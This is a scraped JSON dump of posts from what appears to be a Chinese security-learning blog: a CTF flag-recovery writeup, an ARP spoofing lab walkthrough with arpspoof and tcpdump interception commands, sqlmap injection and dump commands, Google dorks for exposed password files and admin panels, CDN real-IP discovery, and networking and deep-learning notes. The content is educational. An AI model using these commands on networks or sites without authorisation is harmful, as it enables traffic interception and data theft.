(int)v10, v11, v6); sub_1400113CA(&quot;%d&quot;, v12); v16 = v12[0]; if ( v12[0] != 1 ) break; system(&quot;cls&quot;); sub_1400111EF(v15, (__int64)v14); sub_1400111BD(); &#125; switch ( v16 ) &#123; case 2: system(&quot;cls&quot;); sub_140011708(v15, v14, (unsigned int)v13[0]); sub_1400111BD(); break; case 3: system(&quot;cls&quot;); sub_14001149C(); sub_1400111BD(); break; case 4: system(&quot;cls&quot;); sub_1400114E7(); sub_1400111BD(); break; case 5: system(&quot;cls&quot;); puts(&quot;Welcome again&quot;); sub_1400111BD(); exit(1); default: puts(&quot;input error&quot;); sub_1400111BD(); break; &#125; &#125;&#125; 这里并没有有关flag的信息，真正的flag在sub_1400110FF函数中 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576__int64 __fastcall sub_140016760( __int64 a1, __int64 a2, __int64 a3, __int64 a4, _BYTE *a5, __int64 a6, __int64 a7, __int64 a8, _BYTE *a9, _DWORD *a10, int *a11, __int64 a12)&#123; unsigned int v12; // eax _BYTE *v14; // [rsp+1E8h] [rbp+1C8h] int v15; // [rsp+264h] [rbp+244h] int v16; // [rsp+264h] [rbp+244h] int i; // [rsp+284h] [rbp+264h] int v18; // [rsp+2A4h] [rbp+284h] int j; // [rsp+2C4h] [rbp+2A4h] __int64 v20; // [rsp+2E8h] [rbp+2C8h] sub_140011690(&amp;unk_14002D06A); v14 = (_BYTE *)sub_1400112AD(14i64); puts((const char *)a1); puts((const char *)a2); v14[9] = *a5; v14[2] = v14[9]; v14[1] = *(_BYTE *)(a1 + 10) - 12; v14[10] = *(_BYTE *)(a3 + 5) - 56; v14[7] = *(_BYTE *)(a6 + 15) - 10; v14[13] = toupper((char)(*(_BYTE *)(a8 + 3) + 3)); v14[3] = *(_BYTE *)(a2 + 1) + 4; v14[11] = toupper((char)(*(_BYTE *)(a7 + 7) - 14)); v14[4] = v14[7]; *v14 = tolower((char)(*a9 + 31)); v14[8] = toupper(*(char *)(a8 + 27)); v14[5] = toupper((char)(*(_BYTE *)(a4 + 13) - 16)); v14[6] = v14[3]; v14[12] = a5[6] - 39; v12 = sub_1400180A0(0i64); srand(v12); v15 = 1; for ( i = 0; i &lt; 8; ++i ) &#123; v18 = rand() % 10; if ( i != 7 || v18 ) &#123; *a10 += v18 * v15; v15 *= 10; &#125; else &#123; --i; &#125; &#125; v16 = 1; for ( j = 0; j &lt; 8; ++j ) &#123; v20 = rand() % 10; if ( j != 7 || v20 ) &#123; if ( j ) *(_QWORD *)(a12 + 8i64 * *a11) += v20 * v16; else *(_QWORD *)(a12 + 8i64 * *a11) = v20; v16 *= 10; &#125; else &#123; --j; &#125; &#125; return sub_1400112E9(&quot;%s %d\\n&quot;, (const char *)a3, *(_QWORD *)(a12 + 8i64 * (*a11)++));&#125; 真正的flag在v14变量中，是根据已有的变量变换得到的 exp 12345678910111213141516171819202122232425262728293031v3 = &quot;Sloth&#x27;s lottery shop is open!&quot;v4 = &quot;You&#x27;re our first customer!&quot;v5 = &quot;We will give you a free lottery ticket, the number is: &quot;v6 = &quot;Please enter your choice &#123;1-5&#125;&quot;v7 = &quot;1.buy a lottery ticket&quot;v8 = &quot;2.Check to see if you won&quot;v9 = &quot;3.join us&quot;v10 = &quot;4.Take a sneak peek at the flag&quot;v11 = &quot;5.exit&quot;v13 = [0, 0, 0, 0, 0, 0, 0, 0, 10]v15 = [0] * 10v14 = [0] * 10V14 = [0] * 14V14[9] = v7[0]V14[2] = V14[9]V14[1] = chr(ord(v3[10])-12)V14[10] = chr(ord(v5[5]) - 56)V14[7] = chr(ord(v8[15]) - 10)V14[13] = chr(ord(v10[3]) + 3).upper()#V14[3] = chr(ord(v4[1]) + 4)V14[11] = chr(ord(v9[7])-14).upper()#V14[4] = (V14[7])V14[0] = chr(ord(v11[0])+31).lower()#lV14[8] = (v10[27]).upper()#V14[5] = chr(ord(v6[13])-16).upper()#V14[6] = V14[3]V14[12] = chr(ord(v7[6])-39)print(&#x27;&#x27;.join(V14)) XSCTF&#123;th1s_Is_F14G:D&#125;","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"}]},{"title":"DNS重绑定","slug":"dns_rebinding_attack","date":"2022-04-17T09:09:58.753Z","updated":"2022-04-17T09:23:12.728Z","comments":true,"path":"2022/04/17/dns_rebinding_attack/","link":"","permalink":"http://uniqueland.top/2022/04/17/dns_rebinding_attack/","excerpt":"DNS重绑定DNS重绑定指的是在用户访问域名时","text":"DNS重绑定DNS重绑定指的是在用户访问域名时更改域名指向的IP从而令用户访问指定IP的攻击手法 DNS：由于网络传输需要IP地址，故需要DNS（Domian Name Server）用于查询给定域名指向的IP 同源策略（The Same-origin Policy）： The same-origin policy restricts which network messages one origin can send to another. For example, the same-origin policy allows inter-origin HTTP requests with GET and POST methods but denies inter-origin PUT and DELETE requests. Additionally, origins can use custom HTTP headers when sending requests to themselves but cannot use custom headers when sending requests to other origins. The restrictions on reading information received from other origins is also somewhat subtle. For example, the HTML &lt;script&gt; element can execute content retrieved from foreign origins, which means web sites should not rely on the same-origin policy to protect the confidentiality of information in a format that happens to parse as script (e.g., JavaScript source files, JSON format, JSONP services, or JavaScript/gif polyglots). For all such resources, no loss of security would result (and much flexibility would be gained) from adding the Access-Control-Allow-Origin:* header to all responses. 以上解释来自于Same Origin Policy - Web Security (w3.org) 简单来说，为了防止淘宝网带着你的账户信息访问京东，需要同源策略来限制不同网站之间的访问规范 ​ 可以看出同源的要求是“协议+端口+域名/ip”，而如果以域名访问网站（通常的做法）时同源策略就变成了“协议+端口+域名”这就给了DNS重绑定攻击实现的可能 要实现DNS重绑定攻击，攻击者需要具备以下条件： 诱使用户点击给定链接（钓鱼邮件、钓鱼短信、社工等） 可控的DNS服务器（自己搭建一个或者抢一个） ​ DNS重绑定攻击会诱使用户访问一个域名，在用户第一次访问时以正常的IP进行通信，并且在返回的DNS查询结果中将TTL设置为1或其他比较小的数字，在诱使用户以点击等行为构造好恶意请求时，攻击者一般会修改DNS服务器上该域名指向的IP，从而将恶意请求发送至攻击者指定的IP； TTL（Time To Live）指的是dns查询结果的有效时间，通过修改TTL为一个较小的值从而实现受害者与DNS服务器的频繁通信，从而保证在修改域名指向的IP时能立即生效 ​ 易受攻击的设备：一般是位于内网的智能家居设备，由于攻击者无法从外网访问受害者的内网，故以此种攻击伪造身份访问内网（SSRF）；比如恒温器，若在一个只有老人的场所中，这种攻击往往是致命的 quoteSame Origin Policy - Web Security (w3.org)利用DNS重绑定攻击专用网络 - 知乎 (zhihu.com)从0到1认识DNS重绑定攻击 - 先知社区 (aliyun.com)","categories":[],"tags":[{"name":"Internet","slug":"Internet","permalink":"http://uniqueland.top/tags/Internet/"}]},{"title":"GoogleHacking","slug":"google_hacking","date":"2022-04-09T09:12:54.823Z","updated":"2022-04-09T09:37:47.829Z","comments":true,"path":"2022/04/09/google_hacking/","link":"","permalink":"http://uniqueland.top/2022/04/09/google_hacking/","excerpt":"Google HackingGoogle hacking是一系列","text":"Google HackingGoogle hacking是一系列用于高效运用搜索引擎的技巧，也可以用于测试漏洞等用处 A and B 逻辑与，用于查找同时包含A和B的内容 A or B 逻辑或，用于查找包含A或包含B或同时包含A和B的内容 A -B 逻辑非，用于查找A但不包含B的内容 “xxx yyy” 完整匹配，用于查找带有完整xxx yyy的内容 site:xxx.com yyy 指定搜索范围，用于搜索特定范围（xxx.com）内有关yyy的内容 filetype:txt xxx 指定搜索文件类型，用于搜索有关xxx的txt文件 inurl:aaa 搜索匹配网址中带aaa的内容 allinurl: aaa bbb 与inurl相似，只不过可以指定多个关键词 intext:aaa xxx 搜索匹配网页正文中带aaa的且有关xxx的内容 intitle:xxx 搜索匹配网页的标题中包含xxx的内容 xxx* 使用通配符*搜索有关以xxx为前缀的内容 link:xxx.com 返回所有指向xxx.com的网页 related:xxx.com 返回所有与xxx.com相似的网页（指布局相似） cache:xxx.com [yyy] 返回搜索引擎有关xxx.com的缓存，如果加上关键词，则网页中的关键词会被高亮 info:www.xxx.com 返回有关站点www.xxx.com的相关信息 define:xxx 返回有关xxx的定义 Index of /xxx 返回允许当作目录访问的网页 一些技巧：查找网站后台site:xx.com intext:管理 site:xx.com inurl:login site:xx.com intitle:后台 查看服务器使用的程序site:xx.com filetype:asp site:xx.com filetype:php site:xx.com filetype:jsp site:xx.com filetype:aspx 查看上传漏洞site:xx.com inurl:file site:xx.com inurl:load 查看可访问目录index of /admin index of /passwd index of /password index of /mail “index of /“ +passwd “index of /“ +password.txt “index of /“ +.htaccess “index of /root” “index of /cgi-bin” “index of /logs” “index of /config” quoteGoogle-Hacking 语法笔记_Simon_Smith的博客-CSDN博客 2-信息收集—Google hacking_songly_的博客-CSDN博客 信息收集之Google Hacking的简单用法_谢公子的博客-CSDN博客_google hacking Google Hacking使用详解_Teacher.Hu的博客-CSDN博客_google hacking","categories":[],"tags":[{"name":"Internet","slug":"Internet","permalink":"http://uniqueland.top/tags/Internet/"}]},{"title":"arp欺骗初次尝试","slug":"arp_cheat","date":"2022-04-03T12:21:02.410Z","updated":"2022-04-03T13:15:41.089Z","comments":true,"path":"2022/04/03/arp_cheat/","link":"","permalink":"http://uniqueland.top/2022/04/03/arp_cheat/","excerpt":"ARP欺骗是什么ARP欺骗（ARP spoofing），又称ARP毒化","text":"ARP欺骗是什么ARP欺骗（ARP spoofing），又称ARP毒化（ARP poisoning，网络上多译为ARP病毒）或ARP攻击，是针对以太网地址解析协议（ARP）的一种攻击技术，通过欺骗局域网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网络不通。此种攻击可让攻击者获取局域网上的数据包甚至可篡改数据包，且可让网络上特定计算机或所有计算机无法正常连线。 以上来自百度百科 个人理解大概原理就是在每台用于上网的机器中都会有一张叫arp缓存表的东西，里边记录了ip地址与mac地址（物理地址）的映射关系 这张表的形成过程如下： 假设现在我要与ip地址为192.168.1.2的主机通信，我就向局域网内的所有主机广播消息“谁是192.168.1.2 ？”，这时如果该ip的主机收到了广播，就会向发出广播的主机回应“192.168.1.2是我，我的mac地址是xxx”，然后发出广播的主机就将该ip和该mac地址记录到本机的arp缓存表中 而arp欺骗要做的，就是假装自己是某一台被请求的主机，把自己的mac地址与被假装主机的ip绑定起来记录在别人的arp缓存表中；由于网络的实际传输是通过mac地址进行寻址的，这样所有发送到被假装主机的信息都会通过mac地址发送到恶意主机上 具体过程设备：手机一台，电脑一台，树莓派一个 说明： 手机充当受害者（ip：192.168.137.116） 电脑充当网关（开热点 ip：192.168.137.1） 树莓派作为攻击机器（ip：192.168.137.66） 使用程序：arpspoof(需要安装dsniff与ssldump)，tcpdump，driftnet 为什么需要树莓派？ 本来打算用vmware模拟所有的主机的，但是由于局域网的配置问题无法用vmware模拟所有机器，模拟一部分的话又会因为局域网的问题导致虚拟机与物理机无法进行正常通信，所以就拿出了我吃灰多年的原生树莓派 首先使用nmap扫描受害者 确定了受害者的ip之后使用命令 arpspoof -i [网卡（此处为wlan0）] -t [目标ip] [网关ip] 进行欺骗 1sudo arpspoof -i wlan0 -t 192.168.137.116 192.168.137.1 如果仅仅只是想对目标主机进行断网操作的话无需其他操作，但是如果想进行双向的欺骗（中间人攻击），就必须打开树莓派的转发功能，命令如下： 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 然后再打开另一个窗口，安装driftnet 12sudo apt install driftnetsudo driftnet -i [监听网卡] -a -d [截取的图片的存放目录] 这样就可以获取受害者此时的图片了 如果用树莓派查看图片不方便，可以打开80端口，把图片放到网站根目录下再从浏览器访问 实际上在我进行实验时，截图获取得并不是很顺利，所以我选择了另外一种获取通信信息的方式——tcpdump 在arpspoof命令运行的时候，由于受害者与网关的所有通信都会经过攻击机的网卡，故我们可以用tcpdump来获取本地网卡接收到的信息。命令如下： 1sudo tcpdump -i wlan0 -s 0 -w e.cap wlan0是网卡，e.cap是抓包存放的文件名称，回车之后便开始抓包，等到什么时候觉得差不多了就crtl+C停止就行，此时在当前目录下应该会出现刚刚抓包的文件（此处为e.cap），可以使用以下命令读取： 1sudo tcpdump -A -r e.cap -A是以ascii形式显示 -r后面的是要打开的文件，除了这种打开方式，还有类似过滤器的功能 1sudo tcpdump -n dst host 119.91.135.95 -r e.cap 该命令过滤了ip为119.91.135.95的通信信息并显示在屏幕上 以上是传输过程中截取的信息 quoteARP欺骗_百度百科 (baidu.com) kaili linux使用arpspoof进行arp欺骗 - 闻所未闻 - 博客园 (cnblogs.com) ARP–利用arpspoof和driftnet工具进行arp欺骗_mr_xiuk的博客-CSDN博客_arpspoof kali linux操作系统中TCPDUMP详细使用方法_隔壁老湿的技术博客_51CTO博客 Kali渗透-ARP断网攻击与监听_Tr0e的博客-CSDN博客_kali局域网渗透监控 kali linux下的arp攻击 - 逗比大师 - 博客园 (cnblogs.com)","categories":[],"tags":[{"name":"Internet","slug":"Internet","permalink":"http://uniqueland.top/tags/Internet/"}]},{"title":"Sqlmap基本操作","slug":"sqlmap","date":"2022-03-29T02:24:19.004Z","updated":"2022-03-29T05:35:07.410Z","comments":true,"path":"2022/03/29/sqlmap/","link":"","permalink":"http://uniqueland.top/2022/03/29/sqlmap/","excerpt":"sqlmap对于各位CTF的web人应该是必备工具了","text":"sqlmap对于各位CTF的web人应该是必备工具了 安装Linux / Mac OS1git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev Windows安装git-bash之后在选定目录下右键打开git-bash窗口运行上述命令即可 下载地址： https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe 常用命令1234567python sqlmap.py -h # 获取常见选项python sqlmap.py -hh # 获取所有选项python sqlmap.py -u www.example.com # 检测GET注入python sqlmap.py -u www.example.com --batch # 使用默认选项（不用手动选择y/n）python sqlmap.py -u www.example.com --batch --dbs --tables --columns # 返回数据库/表/列python sqlmap.py -u www.example.com --batch -D xxx -T xxx -C xxx # 指定数据库/表/列python sqlmap.py -u www.example.com --batch --dump # 直接返回数据库内容 注：如果是在Linux系统下，python命令可能调用的是python2，如果报错可将python换为python3 ​ 如果有其他报错，尝试将网址等参数用双引号包裹 ​ Windows下可在命令提示符或powershell下运行 在返回数据库/表/列时，可只指定一项 在指定数据库/表/列时，也可只指定一项 一般将dump选项和上述命令结合，直接返回注入结果 更多玩法12345678910python sqlmap.py -m 1.txt # 从文件中导入urlpython sqlmap.py -r res.txt # 从文件中导入http响应python sqlmap.py -l burp.txt # 从文件中导入burp抓包文件python sqlmap.py -u www.example.com --data=&quot;id=1&quot; # 使用POST注入python sqlmap.py -u www.example.com --level 2 # 使用2级注入，检测cookie注入python sqlmap.py -u www.example.com --level 3 # 使用3级注入，检测referer注入和USER-AGENT注入python sqlmap.py -u www.example.com --level 5 # 使用5级注入，检测host注入python sqlmap.py -u www.example.com --random-agent # 使用随机代理python sqlmap.py -u www.example.com --tor # 使用匿名tor网络python sqlmap.py -u www.example.com --hpp # 检测http污染 level默认为1，范围为 1 - 5 更多用法和命令可参照官网文档：http://sqlmap.org/ quoteGitHub - sqlmapproject/sqlmap: Automatic SQL injection and database takeover tool sqlmap详细使用教程_星落.的博客-CSDN博客_sqlmap 超详细SQLMap使用攻略及技巧分享 - FreeBuf网络安全行业门户","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"}]},{"title":"有关BT种子的一些事","slug":"bit_torrent","date":"2022-03-27T11:51:10.696Z","updated":"2022-03-27T13:23:03.596Z","comments":true,"path":"2022/03/27/bit_torrent/","link":"","permalink":"http://uniqueland.top/2022/03/27/bit_torrent/","excerpt":"Bit Torrent (BT种子)是什么？ BitTorrent(简称BT)是一个文件分发协议，每个","text":"Bit Torrent (BT种子)是什么？ BitTorrent(简称BT)是一个文件分发协议，每个下载者在下载的同时不断向其他下载者上传已下载的数据。而在FTP,HTTP协议中，每个下载者在下载自己所需文件的同时，各个下载者之间没有交互。当非常多的用户同时访问和下载服务器上的文件时，由于FTP服务器处理能力和带宽的限制，下载速度会急剧下降，有的用户可能访问不了服务器。BT协议与FTP协议不同，特点是下载的人越多，下载速度越快，原因在于每个下载者将已下载的数据提供给其他下载者下载，充分利用了用户的上载带宽。通过一定的策略保证上传速度越快，下载速度也越快。在很短时间内，BitTorrent协议成为一种新的变革技术。 以上说明来自百度百科 用通俗的话讲，BT种子（以下简称 种子 ）技术其实就是将一个比较大的文件（比如电影或镜像）按照一定的规范分成多个块，当用户通过.torrent文件下载时，会连接上种子文件中记录的tracker服务器，而tracker服务器并不提供文件本身，而是通过查询返回当前同在下载该文件的其他客户端的地址，而主机接收到该地址后，会逐个逐个尝试连接，连接成功的便通过点对点（P2P）的方式获取对方计算机上的另一部分文件，然后再连接其他的客户端，获取文件的其他部分 Bit Torrent 与其他下载方式相比，有什么优势？不同于传统的 C/S ( Client / Server )模式，P2P的下载方式避免了单个服务器提供多个客户端的服务时带宽负载大的问题；在P2P下载时，每一台计算机，既是客户端，又是服务端，在下载的过程中，也向其他有需要的客户端上传自己的文件，有效节省了带宽； 另外，由于P2P去中心化的特点，每个处于BT网络中的文件，其存在与否不再取决于文件的提供者或服务商，在一定程度上避免了文件因个人过失而永久消失的情况 Bit Torrent 与其他下载方式相比，有什么劣势？有优势就肯定有劣势，如上文所说，BT下载是通过同在下载该文件的其他客户端提供的服务来获取文件的，那么，当同时在下载该文件的客户端很少，甚至我们可以假设一种极端情况：整个网络就只有你一台计算机在下载该文件，那么你将不会得到你想要的文件，因为没有其他节点给你提供你想要的文件 另一方面，同样由于BT技术中文件无法轻易清除的特点，文件一旦上传，想永久抹去的可能性不大，那么万一有不法分子上传了本不该出现在网络上的文件（比如有关国家机密或者个人隐私，有或者未上映的电影之类的），其后果不堪设想 torrent文件都记录了什么？A）这个文件（文件夹）中数据的SHA1值，比如一个1G的文件，如果按1M每块进行分块，则会被分为了1000块，torrent中就会有这1000个数据块的指纹值（SHA1的hash值），这个占据了torrent文件的绝大部分空间。这些值的目的是为了下载的过程中进行数据校验，确保数据收到的和当时源头制作torrent时的源文件100%一致，防止恶意数据攻击。 B）一般制作torrent文件时，还会要指定一个或者多个Tracker的地址，比如http://www.a.com:8080/announce这种地址。torrent里面一般也会存储了这个信息，这个其实也尤为重要。相当于记录了一个问询服务器的地址，这个问询服务器的作用，后面我再解释。 C）文件或者文件夹内每个文件的名字，方便下载文件时，磁盘上直接命名好跟原始数据一样的目录结构、文件名。 D）其它一些辅助和可扩展的信息，比如可以配置一个P2SP的http地址辅助下载，比如制作软件的名字、备注……。 E）上面信息生成后，torrent会把A）里面的这些信息，以及torrent里面的文件名等关键信息，再进行一次Hash，生成一个新的SHA1值，作为torrent的HASH值，也就是我们经常看到的下载软件里面对这个种子命名的一个唯一的hash值，也有的在magnet这种磁力链接中可以看到这个值，这就是torrent的唯一标记。 以上就是.torrent文件的内容，可以用记事本打开，但可能看到乱码。这个文件的编码遵循了bencode编码规则。但实际内容就主要是上面这些。所以，torrent可以理解为对原始数据的一些记录。 如果下载时没有其他节点在线。又没有http服务器，是不是就不能进行下载了呢？不一定，BT发明者提出了DHT（Distributed Hash Table）的概念，就算Tracker连不上了，也可以通过分布式哈希表DHT技术，通过DHT网络慢慢的寻找志同道合的邻居节点，只是没有Tracker那么直接那么快速，但慢一些总还是有机会找到邻居的 有关下载过程中的一些事文件下载时，若存在提供下载服务的http服务器，那么就算没有其他的客户端在线，下载仍然可以进行 下载过程中出现卡在99.99%的原因是因为当所有分块都下载完毕时，电脑会对下载的文件进行文件校验（类似于哈希检验），而当文件校验不通过时，电脑就会对组成文件的所有分块逐个逐个进行检验，发现校验值不对的文件分块再重新下载，这就是为什么有时候下载卡住的原因 当文件下载完毕时，如果你没有关闭下载文件的客户端，那么如果有其他人需要你的文件，即使你没有在下载文件，你所拥有的文件分块依然可以上传给其他客户端，成为一名崇高的传递者 文件下载时，影响下载速度的，除了你的电脑当前的网速，其实还有你的电脑当前的上传速度；在BT网络的带宽分配中，上传速度快的客户端能够获得的下载速度会相对比较快 某些运营商会对BT下载时的通信进行拦截，它们会对通信过程中传输的内容进行分析，由于早期的下载传输的是明文，故很容易就能够被运营商截取；当然，道高一尺，魔高一丈，如今的下载过程传输的内容大部分都进行过加密 quoteBitTorrent_百度百科 (baidu.com) https://www.zhihu.com/question/49829233/answer/160765176","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"有关cdn和真实ip的一些事","slug":"cdn","date":"2022-03-20T06:21:18.883Z","updated":"2022-03-20T07:18:43.324Z","comments":true,"path":"2022/03/20/cdn/","link":"","permalink":"http://uniqueland.top/2022/03/20/cdn/","excerpt":"CDN是什么？ CDN(Content Delivery Network)是指内容分发网络，也称为","text":"CDN是什么？ CDN(Content Delivery Network)是指内容分发网络，也称为内容传送网络，这个概念始于1996年，是美国麻省理工学院的一个研究小组为改善互联网的服务质量而提出的。为了能在传统IP网上发布丰富的宽带媒体内容，他们提出在现有互联网基础上建立一个内容分发平台专门为网站提供服务，并于1999年成立了专门的CDN服务公司，为Yahoo提供专业服务。由于CDN是为加快网络访问速度而被优化的网络覆盖层，因此被形象地称为“网络加速器”。 以上是来自百度百科的解释个人理解，通俗点说，cdn其实就是一些服务器，将你的一些静态文件（html）什么的复制一份，然后等有人访问网站的时候再就近选择cdn服务器把你的那些静态页面返回，这样就不用通过你的服务器，从而减轻带宽负载了 CDN和IP是什么关系？由于用户获取静态文件时大概率会由CDN服务器返回，则大多数情况下用户输入域名访问网站时，实际进行通信的很可能不是该网站真实的IP，而是CDN服务器的IP CDN的好处有哪些？最明显的也是大部分人最需要的，就是减少自家服务器的带宽负载此外还有一个好处，就是隐藏服务器的真实IP（但是不能百分百隐藏） CDN隐藏IP的好处是什么？为什么不能完全隐藏？隐藏IP最大的好处就是在一定程度上避免自家服务器受到攻击（DDoS攻击之类的），因为不法分子无法知道我们服务器的真实IP，也就无法对该IP进行大量重复的请求从而达到使网站拒绝服务的效果，最多就是把最近的CDN服务器打了下来那天下CDN千千万，你把这个打下来了又有什么用呢？你又不能确保你下一个访问的服务器一定不是CDN 我怎么知道自己的请求是不是到了CDN呢？想知道自己访问的服务器是不是CDN，有几种办法：windows命令行用nslookup命令查询一下目标域名，如果一个域名对应着好几个IP，那十有八九是使用了CDN；当然，如果只返回了一个IP也不能说明目标网站就没有使用CDN在CDN查询网站上查 http://ping.chinaz.com/http://ping.aizhan.com/http://ce.cloud.360.cn/ 查子域名：因为大部分站长使用CDN针对的大多是首页等访问量比较大的页面，那么子页面就有可能没有使用CDN，这时候查询子页面返回的结果很有可能就是真实IP漏洞利用：用CTF那套试试。不过不提倡且大部分情况下不合法分析服务器返回的信息：有些网站会有邮件服务或者订阅服务之类的，而这些服务有时并不会使用CDN，通过分析邮件源码就可以得到IP通过国外访问：有些CDN只面向国内的请求，对于不在服务范围的国外请求有可能不会经过CDN而直接访问真实IP直接访问CDN服务器：最直接的方法就是拿到CDN服务器的账户自己上去查 怎样才能有CDN服务？除了花钱买这一最直接的方法之外，还有另外一种能够获得CDN服务的方法，就是在租赁域名的时候很多服务提供商会免费对该域名提供CDN服务，不要白不要 以下是对我自己网站的CDN查询 最后再说一句，拿到真实IP了也未必能够通过IP访问目标网站 quotehttps://blog.csdn.net/fly_hps/article/details/98486807https://www.cxybb.com/article/weixin_37104668/115167764https://baike.baidu.com/item/CDN/420951","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"curl的常见用法","slug":"curl","date":"2022-03-12T12:22:27.696Z","updated":"2022-03-12T12:52:54.139Z","comments":true,"path":"2022/03/12/curl/","link":"","permalink":"http://uniqueland.top/2022/03/12/curl/","excerpt":"curl用法：","text":"curl用法： 123456789101112131415161718192021222324252627282930313233343536373839GET请求：curl https://www.xxx.comPOST请求：curl -d key=value https://www.xxx.com填写表单：curl -F key1=value1 -F key2=value2 https://www.xxx.com/xxx.cgi显示信息：curl -i https://www.xxx.com指定USER-AGENTcurl -A &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.39&quot; https://www.xxx.com注：若留空则移除User-Agent标头跟随重定向：curl -L https://www.xxx.com注：curl默认不跟随重定向发送cookie：curl -b &quot;foo=bar&quot; https://www.xxx.comurl编码：curl --data-urlencode &quot;xxxxxxx&quot; https://www.xxx.com注：该方式与-d相近，区别在于是否编码保存网页(与wget相似)：curl -o xxx.html https://www.xxx.com用户认证：curl -u &quot;user:passwd&quot; https://www.xxx.com/login输出通信过程：curl -v https://www.xxx.com输出二进制数据：curl --trace - https://www.xxx.com注：可配合-o导出 quotehttps://www.jianshu.com/p/fc0eb6c60816https://www.ruanyifeng.com/blog/2019/09/curl-reference.html","categories":[],"tags":[{"name":"tool","slug":"tool","permalink":"http://uniqueland.top/tags/tool/"}]},{"title":"ftp,sftp与ssh之间的关系","slug":"ftp_sftp_ssh","date":"2022-03-06T03:27:06.551Z","updated":"2022-03-06T05:24:37.416Z","comments":true,"path":"2022/03/06/ftp_sftp_ssh/","link":"","permalink":"http://uniqueland.top/2022/03/06/ftp_sftp_ssh/","excerpt":"ftp和sftp的区别这两种协议都是用于传输文件的，其中sftp是基于ssh的原理","text":"ftp和sftp的区别这两种协议都是用于传输文件的，其中sftp是基于ssh的原理开发的 ftp: File Transfer Protocolstfp: Secure File Transfer Protocol / SSH File Transfer Protocolssh: Secure Shell ftpftp是明文传输，有两种模式：主动模式和被动模式 主动模式(Positive Mode)：在该模式下，服务端开放21，20端口；21端口用于接收用户名和密码，20端口用于传输数据客户端登录ftp服务器后随机开放一个端口，再将这个端口的信息发送给服务端，服务端再通过用于传输数据的20端口连接至用户提供的端口 被动模式(Passive Mode)：在该模式下，服务端开放用于客户端连接的21端口以及一个随机端口，而客户端在登录ftp服务器后接收服务端提供的随机端口的信息，再连接至服务端的该端口以传输数据 stfp 首先要明确的一点是，stfp是ssh的一个子服务 sftp是基于ssh的技术进行文件的传输的，而ssh是通过22端口进行通信的，也就是说sftp也是通过22端口进行通信以及数据传输的，与ftp协议相比，除了通信端口的不同，由于ssh的通信过程是加密的，所以sftp中文件的传输也是加密的，但实际的安全性还取决于ssh的连接方式；且在ssh服务器与通信主机（服务器）分开时还分有半安全模式(Less Secure Connection)和安全模式(Full Secure Connection) 半安全模式指用户通过ssh连接ssh服务器时所有的数据都是加密的，而ssh服务器与主机间通信的数据是未加密的 安全模式指用户与ssh服务器以及ssh服务器与主机间的通信都是加密的 而当ssh服务运行于目标主机上时便不存在半安全模式和安全模式之分了 ssh作为远程连接主机的常用方式，ssh有两种连接方式，一种是通过用户名和密码进行通信，这种方式非常方便，只需要任意一台能够接入互联网的常用设备就能够连接上远程主机，但是这种方式存在受到中间人攻击的可能；另一种方式是通过密钥分发的方式，即在服务端生成一份私钥存于服务器，再生成一份公钥分发给需要通信的主机，这种方式不需要用户名和密码，并且通信时需要进行密钥与公钥的验证，基本杜绝了中间人攻击的可能，但是由于需要提前准备好公钥，故便携性不如第一种方式 quotehttps://network.51cto.com/article/603552.htmlhttps://www.zhihu.com/question/20402010https://blog.csdn.net/cuker919/article/details/6403925","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"Deep Learning from Scratch 5","slug":"deep_learning_from_scratch_5","date":"2021-12-25T08:05:51.980Z","updated":"2021-12-25T08:44:21.959Z","comments":true,"path":"2021/12/25/deep_learning_from_scratch_5/","link":"","permalink":"http://uniqueland.top/2021/12/25/deep_learning_from_scratch_5/","excerpt":"深度学习应用案例","text":"深度学习应用案例 物体检测 – R-CNN 图像分割 – FCN 图像标题的生成 – NIC (CNN+RNN) 图像风格变换 图像的生成 – DCGAN 自动驾驶 Dep Q-Network (强化学习) 多模态处理 组合图像和自然语言等多种信息进行的处理 GAN 生成式对抗网络（GAN, Generative Adversarial Networks ）是一种深度学习模型，是近年来复杂分布上无监督学习最具前景的方法之一。模型通过框架中（至少）两个模块：生成模型（Generative Model）和判别模型（Discriminative Model）的互相博弈学习产生相当好的输出。原始 GAN 理论中，并不要求 G 和 D 都是神经网络，只需要是能拟合相应生成和判别的函数即可。但实用中一般均使用深度神经网络作为 G 和 D 。 –Baidu Baike","categories":[],"tags":[{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"}]},{"title":"Deep Learning from Scratch 4","slug":"deep_learning_from_scratch_4","date":"2021-12-18T13:14:56.550Z","updated":"2021-12-19T03:18:49.592Z","comments":true,"path":"2021/12/18/deep_learning_from_scratch_4/","link":"","permalink":"http://uniqueland.top/2021/12/18/deep_learning_from_scratch_4/","excerpt":"卷积神经网络与普通机器学习的区别","text":"卷积神经网络与普通机器学习的区别 CNN中新出现了卷积层和池化层 全连接层存在的问题在全连接层中，传入的图像的形状信息被破坏了；由于在全连接层中，数据是以一维的形式传入的，故忽略了图像中诸如相邻像素之间的关系 特征图卷积层的输入输出数据。根据输入和输出分为输入特征图和输出特征图 卷积运算卷积运算是以一定的间隔滑动滤波器的窗口并对输入数据应用滤波器，应用的方式有乘积累加，偏置和求和等 填充向输入数据的周围填入固定的数值；“幅度为1的填充”指的是向输入数据周围1个单位的范围内填充0 作用：调整输出的大小，由于在卷积运算中空间不断缩小，为了在保持输出大小不变的前提下进行卷积运算甚至深度卷积，就需要填充来调整数据空间大小 步幅 应用滤波器的位置间隔 